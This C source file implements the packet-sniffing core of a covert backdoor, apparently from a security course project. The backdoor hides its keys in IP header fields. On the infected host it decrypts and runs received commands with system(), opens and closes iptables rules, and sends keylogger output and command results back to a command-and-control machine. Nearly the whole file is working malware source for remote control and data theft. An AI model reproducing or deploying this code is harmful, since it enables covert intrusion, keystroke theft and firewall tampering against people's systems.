#include "libpcap.h"

int Packetcapture(char *filter, struct filter Filter){
    char errorbuffer[PCAP_ERRBUF_SIZE];
    struct bpf_program fp; //holds fp program info
    pcap_if_t *interface_list;
    bpf_u_int32 netp; //holds the ip

    //find the first network device capable of packet capture
    if(pcap_findalldevs(&interface_list,errorbuffer) == -1){
        printf("pcap_findalldevs: %s\n", errorbuffer);
        exit(0);
    }

    //open the network device
    //BUFSIZ is defined in pcap.h
    if((interfaceinfo = pcap_open_live(interface_list->name, BUFSIZ, 1, -1, errorbuffer)) == NULL){
        printf("pcap_open_live(): %s\n", errorbuffer);
        exit(0);
    }
    if(pcap_compile(interfaceinfo, &fp, filter, 0, netp) == -1){
        perror("pcap_comile");
    }

    if(pcap_setfilter(interfaceinfo, &fp) == -1){
        perror("pcap_setfilter");
    }

    //main loop for receiving
    pcap_loop(interfaceinfo, -1, ReadPacket, (u_char*)&Filter);
    return 0;
}

void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    //grab the type of packet
    struct ether_header *ethernet;
    ethernet = (struct ether_header *)packet;
    u_int16_t type = ntohs(ethernet->ether_type);
    struct filter* Filter = NULL;
    Filter = (struct filter *)args;
    if(type == ETHERTYPE_IP){
        ParseIP(Filter, pkthdr, packet);
    }
}

void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    struct filter* Filter = NULL;
    Filter = (struct filter *)args;
    const struct my_ip* ip;
    u_int length = pkthdr->len;
    u_int hlen,off,version;
    int len;

    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length-= sizeof(struct ether_header);

    if(length < sizeof(struct my_ip)){
        printf("Packet length is incorrect %d", length);
        exit(1);
    }
    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);
    off = ntohs(ip->ip_off);

    //if the packet is the wrong version and size exit
    if(version != 4){
        perror("Unknown error");
        exit(1);
    } else if(hlen < 5){
        perror("Bad header length");
        exit(1);
    } else if((int)length < len){
        perror("Truncated IP");
        exit(1);
    }

    if(ip->ip_p == IPPROTO_UDP){

        if(CheckKey(ip->ip_tos, ip->ip_id) == COMMAND){
            //only CNC will get into this loop
            //port knocking packet
            if(Filter->infected == false){
                //PortKnocking(Filter, pkthdr, packet, false, false);
            }
        } else if(ip->ip_id == 'r' && ip->ip_tos == 'r' && ip->ip_ttl == 'r'){
            if(Filter->infected){
                recv_results(Filter->localip, UPORT, FILENAME, false);
                system(CHMOD);
                system(CMD);
                //open outbound rule
                iptables(Filter->targetip, false, PORT, false, false);
                printf("COMMAND RECEIEVED \n");
                //sending the results back to the CNC
                unsigned char *buf = 0;
                //PortKnocking(Filter, pkthdr, packet, true, false);
                //covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[0], Filter->port_short[0], buf, 2);
                //covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[1], Filter->port_short[1], buf, 2);
                printf("SENDING RESULTS\n");
                send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, false);
                iptables(Filter->targetip, false, PORT, false, true);
                printf("\n");
                printf("\n");
                printf("Waiting for new command\n");
            }
        } else {
            printf("Wrong key tossing packet\n");
        }
    }
}

void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct my_ip* ip;
    u_int length = pkthdr->len;
    u_int hlen,off,version;
    int len;
    FILE *fp;

    //skip past the ethernet header
    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
    length-= sizeof(struct ether_header);

    if(length < sizeof(struct my_ip)){
        printf("Packet length is incorrect %d", length);
        exit(1);
    }

    len = ntohs(ip->ip_len);
    hlen = IP_HL(ip);
    version = IP_V(ip);
    off = ntohs(ip->ip_off);

    if(version != 4){
        perror("Unknown error");
        exit(1);
    } else if(hlen < 5){
        perror("Bad header length");
        exit(1);
    } else if((int)length < len){
        perror("Truncated IP");
        exit(1);
    }

    if((fp = fopen(RESULT_FILE, "ab+")) < 0){
        perror("fopen");
        exit(1);
    }

    //CNC receiving results
    if(Filter->infected == false) {
        //check the key
        printf("tos: %c\n", ip->ip_tos);
        printf("ipid: %c\n", ip->ip_id);
        printf("ttl: %c\n", ip->ip_ttl);
        if(CheckKey(ip->ip_tos, ip->ip_id) > 0) {
            //check if EOT packet
            if(ip->ip_ttl == 4) {
                fclose(fp);
                pcap_breakloop(interfaceinfo);
                //exits the program
            }

            //write to file
            char ch[1];
            ch[0] = (char)ip->ip_ttl;

            if(fwrite(ch, sizeof(char), sizeof(char), fp) <= 0){
                perror("fwrite");
                exit(1);
            }
        }
    //infected machine receiving a command
    } else if(Filter->infected == true) {
        struct in_addr src;

        switch(CheckKey(ip->ip_tos, ip->ip_id)) {
            case COMMAND:
                printf("COMMAND\n");
                //write command to .cmd
                break;
            case KEYLOGGER:
                src = ip->ip_src;
                printf("source: %d", ntohs(src.s_addr));
                if(src.s_addr == inet_addr(Filter->targetip)){
                    printf("KEYLOGGER\n");
                    //copy keylogger file to results file
                    system("cat .keylogger.txt > .results");
                    sleep(1);
                    send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp);
                }
                break;
            case INOTIFY:
                printf("INOTIFY\n");
                //write to inotify file
                break;
            case UDPCOMMAND:
                printf("UDP\n");
                //EOT, stop receiving and start sending
                break;
            case EOT:
                printf("EOT\n");
                //EOT, stop receiving and start sending

                //if inotify
                    //start inotify
                    //when completed, copy inotify file to results file
                //if command
                    //CHMOD it
                    //run the file and pipe to results file
                break;
            default:
                printf("DEBUG: Packet tossed wrong key\n");
                break;
        }
    }

    fclose(fp);
}

int CheckKey(u_char ip_tos, u_short ip_id){
    // check if key is right for normal packets
    if(ip_tos == 'c' && ip_id == 'c'){
        return COMMAND;
    } else if(ip_id == 'u' && ip_tos == 'u') {
        return UDPCOMMAND;
    } else if(ip_tos == 'k' && ip_id == 'k') {
        return KEYLOGGER;
    } else if(ip_tos == 'i' && ip_id == 'i') {
        return INOTIFY;
    } else if(ip_tos == '4' && ip_id == '4') {
        return EOT;
    } else {
        return -1;
    }
}

void ParseTCP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;
    int size_ip;
    int size_tcp;
    int size_payload;

    ip = (struct my_ip*)(packet + 14);
    size_ip = IP_HL(ip)*4;

    tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
    size_tcp = TH_OFF(tcp)*4;

    if(size_tcp < 20){
        perror("TCP: Control packet length is incorrect");
        exit(1);
    }
    payload = (u_char *)(packet + 14 + size_ip + size_tcp);

    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

    if(size_payload > 0){
        ParsePayload(Filter, payload, size_payload, true);
    }
}

void iptables(char *ip, bool tcp, char *port, bool input, bool remove){
    char iptable[BUFSIZ];
    memset(iptable, '\0', BUFSIZ);
    if(remove){
        strcat(iptable,"/usr/sbin/iptables -D");
    } else {
        strcat(iptable,"/usr/sbin/iptables -I");
    }
    if(input){
        if(tcp){
            strcat(iptable," INPUT -p tcp ");
        } else {
            strcat(iptable," INPUT -p udp ");
        }
    } else {
        if(tcp){
            strcat(iptable," OUTPUT -p tcp ");
        } else {
            strcat(iptable," OUTPUT -p udp ");
        }
    }
    strcat(iptable, "-s ");
    strcat(iptable, ip);
    strcat(iptable, " --dport ");
    strcat(iptable,port);
    strcat(iptable, " -j ACCEPT");
    printf("Iptables: %s\n", iptable);
    system(iptable);
}

void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tcp){
    FILE *fp;
    unsigned char decryptedtext[BUFSIZE+16];
    int decryptedlen, cipherlen;

    if((fp = fopen(FILENAME, "wb+")) < 0){
        perror("fopen");
        exit(1);
    }
    cipherlen = strlen((char*)payload);
    decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);

    if((fwrite(decryptedtext, strlen((const char*)decryptedtext), sizeof(char), fp)) <= 0){
        perror("fwrite");
        exit(1);
    }
    if(tcp){
        fclose(fp);
        system(CHMOD);
        system(CMD);
        iptables(Filter->targetip, true, PORT, false, false);
        printf("COMMAND RECEIEVED \n");
        //sending the results back to the CNC
        //PortKnocking(Filter, NULL, NULL, true, true);
        printf("SENDING RESULTS\n");
        send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, true);
        iptables(Filter->targetip, true, PORT, false, true);
        printf("\n");
        printf("\n");
        printf("Waiting for new command\n");
    } else {
        printf("parsing udp packet\n");
    }
}

struct filter InitFilter(char *target, char *local, bool infected, bool tcp){
    struct filter Filter;

    Filter.infected = infected;
    strncpy(Filter.targetip, target, BUFSIZ);
    strncpy(Filter.localip, local, BUFSIZ);
    Filter.tcp = tcp;

    return Filter;
}

void CreateFilter(char *buffer, bool tcp){
    memset(buffer, '\0', BUFSIZ);

    if(tcp){
        strcat(buffer,"tcp and ");
    } else {
        strcat(buffer,"udp and ");
    }

    strcat(buffer, "port ");
    strncat(buffer, PORT, sizeof(PORT));
}

/*
void PortKnocking(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool send, bool tcpp){
    const struct sniff_tcp *tcp=0;
    const struct my_ip *ip;
    const char *payload;
    int size_ip;
    int size_tcp;
    int size_payload;

    if(send){
        unsigned char data[BUFSIZE] = "";
        printf("PORT KNOCKING\n");
        SendPattern(data, Filter, tcpp);
    } else {
        //parse the tcp packet and check for key and port knocking packets
        if(tcpp){

            ip = (struct my_ip*)(packet + 14);
            size_ip = IP_HL(ip)*4;

            tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
            size_tcp = TH_OFF(tcp)*4;

            if(size_tcp < 20){
                perror("TCP: Control packet length is incorrect");
                exit(1);
            }

            payload = (u_char *)(packet + 14 + size_ip + size_tcp);

            size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

            for(int k = 0; k < Filter->amount; k++){
                if(Filter->port_short[k] == ntohs(tcp->th_dport)){
                    Filter->pattern[k] = 1;
                }
            }
            if((Filter->pattern[0] == 1) && (Filter->pattern[1] == 1)){
                iptables(Filter->targetip, true, PORT, true, false);
                char *dip = Filter->targetip;
                printf("WAITING FOR DATA\n");
                recv_results(dip, UPORT, RESULT_FILE, true);
                iptables(Filter->targetip, true, PORT, true, true);
                pcap_breakloop(interfaceinfo);
            }
        } else {
            ip = (struct my_ip*)(packet + sizeof(struct ether_header));
            const struct sniff_udp *udpheader;
            udpheader = (struct sniff_udp*)(packet + 14 + (IP_HL(ip)*4));

            for(int k = 0; k < Filter->amount; k++){
                if(Filter->port_short[k] == ntohs(udpheader->uh_sport)){
                    Filter->pattern[k] = 1;
                }
            }
            if((Filter->pattern[0] == 1) && (Filter->pattern[1] == 1)){
                iptables(Filter->targetip, false, PORT, true, false);
                printf("WAITING FOR DATA\n");
                recv_results(Filter->localip, UPORT, RESULT_FILE, false);
                iptables(Filter->targetip, false, PORT, true, true);
                pcap_breakloop(interfaceinfo);
            }
        }
    }
}


void SendPattern(unsigned char *data, struct filter *Filter, bool tcp){
    for(int i = 0; i < Filter->amount; i++){
        if(tcp){
            covert_send(Filter->localip, Filter->targetip, Filter->port_short[i], Filter->port_short[i], data, 2);
        } else {
            covert_udp_send(Filter->localip, Filter->targetip, Filter->port_short[i], Filter->port_short[i], data, 2);
        }
    }
}
*/
